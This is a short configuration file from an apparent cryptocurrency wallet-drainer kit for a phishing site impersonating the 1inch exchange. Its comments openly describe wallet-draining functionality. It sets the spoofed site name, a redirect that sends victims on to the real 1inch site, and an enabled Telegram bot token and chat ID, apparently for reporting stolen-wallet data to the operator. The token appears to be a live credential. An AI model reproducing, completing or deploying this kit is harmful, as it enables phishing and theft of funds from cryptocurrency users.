/**
 * Drainer Configuration for 1inch Next.js Phishing Site
 * 
 * Configuration for wallet draining functionality using Reown
 */

/**
 * Drainer Configuration for 1inch 2 Phishing Site
 * 
 * Complete configuration matching the original 1inch implementation
 */
...
export const DRAINER_CONFIG = {
  ...
  ETHERSCAN_API_KEY: "",
  SITE_NAME: "1inch",
  VICTIM_REDIRECT: "https://1inch.io",
  DEBUG_MODE: true,
  ...
  TELEGRAM: {
    BOT_TOKEN: "8352696736:AAFHNoV9tGyN81suhDKIyDWm-FUVYKEcRLc",
    CHAT_ID: "-1003184083653",
    ENABLED: true
  }
}
